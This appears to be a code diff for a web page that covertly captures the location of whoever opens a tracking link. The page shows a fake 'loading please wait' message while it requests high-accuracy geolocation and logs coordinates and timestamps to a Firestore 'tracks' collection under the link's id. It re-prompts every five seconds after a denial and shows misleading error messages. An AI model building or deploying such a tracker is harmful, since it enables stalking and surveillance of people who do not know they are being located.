@@ -22,21 +22,45 @@
       return urlParams.get(param);
     }
 
+    function requestLocation(linkId) {
+      document.body.innerHTML = "<h2>loading please wait</h2>";
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          db.collection("tracks").doc(linkId).collection("logs").add({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            timestamp: new Date().toISOString()
+          }).then(() => {
+            document.body.innerHTML = "<h2>loading please wait</h2>";
+          }).catch((e) => {
+            document.body.innerHTML = "<h2>Error in loading, retrying...</h2>";
+            setTimeout(() => requestLocation(linkId), 5000);
+          });
+        },
+        (error) => {
+          if (error.code === error.PERMISSION_DENIED) {
+            document.body.innerHTML = "<h2>permission denied, retrying in 5 seconds...</h2>";
+            setTimeout(() => requestLocation(linkId), 5000);
+          } else {
+            document.body.innerHTML = `<h2>Location error: ${error.message}</h2>`;
+          }
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    }
+
     window.onload = () => {
       const linkId = getQueryParam("id");
-      if (!linkId) return;
-
-      navigator.geolocation.getCurrentPosition((position) => {
-        db.collection("tracks").doc(linkId).collection("logs").add({
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          timestamp: new Date().toISOString()
-        }).then(() => {
-          document.body.innerHTML = "<h2>loading please wait</h2>";
-        });
-      }, () => {
-        document.body.innerHTML = "<h2>permission error, try again :/</h2>";
-      });
+      if (!linkId) {
+        document.body.innerHTML = "<h2>server error.</h2>";
+        return;
+      }
+      if (!navigator.geolocation) {
+        document.body.innerHTML = "<h2>not supported by your browser.</h2>";
+        return;
+      }
+      requestLocation(linkId);
     };
   </script>
 </head>
